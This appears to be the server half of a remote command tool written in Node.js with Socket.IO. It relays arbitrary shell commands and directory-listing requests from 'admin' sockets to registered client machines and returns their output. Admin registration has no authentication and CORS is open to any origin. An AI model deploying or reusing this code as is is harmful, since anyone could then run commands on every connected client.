const { Server } = require('socket.io');
const { SOCKET_EVENTS } = require('../config/socketEvents');
const { buildRootDirectoryCommand, buildListDirectoryCommand } = require('../utils/cmdBuild');
const { parseDirectoryOutput } = require('../utils/dirParser');
const { getWindowsParentPath, getUnixParentPath } = require('../utils/pathUtils');

// Store connected clients and admins
const clients = new Map(); // socketId -> { socket, info }
const admins = new Map();  // socketId -> socket

// Pending commands waiting for response
// value: { adminSocketId, clientSocketId, isListDir?, listDirPath?, platform?, homeDir? }
const pendingCommands = new Map();

/**
 * Resolve list-dir path and build the shell command for the client
 */
function resolveListDirCommand(command, client) {
  const platform = client.info?.platform || 'win32';
  const homeDir = client.info?.homeDir || '';
  const { path: reqPath, currentPath = '' } = command;

  let pathToUse = currentPath;
  if (reqPath === 'root' || reqPath === '' || reqPath === undefined) {
    pathToUse = '';
  } else if (reqPath === '..') {
    if (platform === 'win32') {
      pathToUse = getWindowsParentPath(currentPath);
      if (pathToUse === null) pathToUse = '';
    } else {
      pathToUse = getUnixParentPath(currentPath, homeDir);
      if (pathToUse === null) pathToUse = homeDir || '/';
    }
  } else {
    pathToUse = reqPath;
  }

  const stringCommand =
    pathToUse === ''
      ? buildRootDirectoryCommand(platform)
      : buildListDirectoryCommand(pathToUse, platform);

  return { stringCommand, pathForParser: pathToUse, platform };
}

/**
 * Generate a unique command ID
 * @returns {string} - Unique command ID
 */
function generateCommandId() {
  return `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

/**
 * Broadcast to all admins
 * @param {object} io - Socket.IO instance
 * @param {string} event - Event name
 * @param {any} data - Data to broadcast
 */
function broadcastToAdmins(io, event, data) {
  admins.forEach((socket) => {
    socket.emit(event, data);
  });
}

/**
 * Get all clients info for admins
 * @returns {Array} - Array of client info objects
 */
function getAllClientsInfo() {
  const clientsInfo = [];
  clients.forEach((client, socketId) => {
    clientsInfo.push({
      socketId,
      info: client.info
    });
  });
  return clientsInfo;
}

/**
 * Initialize Socket.IO server
 * @param {object} httpServer - HTTP server instance
 * @returns {object} - Socket.IO instance
 */
function initializeSocketIO(httpServer) {
  const io = new Server(httpServer, {
    cors: {
      origin: '*',
      methods: ['GET', 'POST']
    }
  });

  io.on('connection', (socket) => {
    console.log(`🔌 New socket connection: ${socket.id}`);

    // Client registration
    socket.on(SOCKET_EVENTS.REGISTER_CLIENT, (info) => {
      console.log(`📱 Client registered: ${socket.id}`, info);
      clients.set(socket.id, { socket, info });

      broadcastToAdmins(io, SOCKET_EVENTS.CLIENT_CONNECTED, {
        socketId: socket.id,
        info,
      });

      socket.emit('registration-success', { socketId: socket.id });
    });

    // Admin registration
    socket.on(SOCKET_EVENTS.REGISTER_ADMIN, () => {
      console.log(`👤 Admin registered: ${socket.id}`);
      admins.set(socket.id, socket);

      socket.emit(SOCKET_EVENTS.CLIENTS_LIST, getAllClientsInfo());
    });

    // Admin sends command to a specific client (command: string or object e.g. { type, path, currentPath })
    socket.on(SOCKET_EVENTS.SEND_COMMAND, ({ clientSocketId, command }) => {
      const client = clients.get(clientSocketId);
      if (!client) {
        socket.emit(SOCKET_EVENTS.COMMAND_ERROR, {
          error: 'Client not found or disconnected',
          clientSocketId,
        });
        return;
      }

      const commandId = generateCommandId();
      let payloadToSend = command;
      let listDirPath = '';
      let listDirPlatform = client.info?.platform || 'win32';
      const commandType = command && typeof command === 'object' ? command.type : undefined;

      if (commandType === 'list-dir') {
        try {
          const { stringCommand, pathForParser, platform } = resolveListDirCommand(command, client);
          payloadToSend = stringCommand;
          listDirPath = pathForParser;
          listDirPlatform = platform;
        } catch (err) {
          socket.emit(SOCKET_EVENTS.COMMAND_ERROR, {
            error: err.message || 'Failed to build list-dir command',
            clientSocketId,
          });
          return;
        }
      }
      else if (commandType === 'upload') {       
      }

      pendingCommands.set(commandId, {
        adminSocketId: socket.id,
        clientSocketId,
        type: commandType,
        listDirPath,
        listDirPlatform,
      });

      client.socket.emit(SOCKET_EVENTS.EXECUTE_COMMAND, {
        commandId,
        command: payloadToSend,
      });

      socket.emit(SOCKET_EVENTS.COMMAND_SENT, { commandId, clientSocketId });
    });

    // Client sends command result back
    socket.on(SOCKET_EVENTS.COMMAND_RESULT, ({ commandId, result, error }) => {
      const pending = pendingCommands.get(commandId);
      if (!pending) return;
      pendingCommands.delete(commandId);

      const admin = admins.get(pending.adminSocketId);
      if (!admin) return;

      let resultToSend = result;
      if (pending.type === 'list-dir' && !error && result != null) {
        try {
          const raw = typeof result === 'string' ? result : String(result);
          const parsed = parseDirectoryOutput(raw, pending.listDirPlatform, pending.listDirPath);
          resultToSend = {
            ...parsed,
            currentPath: pending.listDirPath,
          };
        } catch (parseErr) {
          resultToSend = { directories: [], files: [], currentPath: pending.listDirPath };
        }
      }
      else if (pending.type === 'upload') {
        resultToSend = typeof result === 'string' ? JSON.parse(result) : result;
      }

      admin.emit(SOCKET_EVENTS.COMMAND_RESPONSE, {
        commandId,
        clientSocketId: pending.clientSocketId,
        result: resultToSend,
        error,
      });
    });

    // Handle disconnection
    socket.on(SOCKET_EVENTS.DISCONNECT, () => {
      console.log(`🔌 Disconnected: ${socket.id}`);

      if (clients.has(socket.id)) {
        const clientInfo = clients.get(socket.id).info;
        clients.delete(socket.id);

        broadcastToAdmins(io, SOCKET_EVENTS.CLIENT_DISCONNECTED, {
          socketId: socket.id,
          info: clientInfo,
        });
      }
      
      // Check if it was an admin
      if (admins.has(socket.id)) {
        admins.delete(socket.id);
        
        // Clean up any pending commands from this admin
        pendingCommands.forEach((value, key) => {
          if (value.adminSocketId === socket.id) {
            pendingCommands.delete(key);
          }
        });
      }
    });
  });

  return io;
}

module.exports = {
  initializeSocketIO,
  getAllClientsInfo,
  broadcastToAdmins,
  clients,
  admins,
  pendingCommands,
};

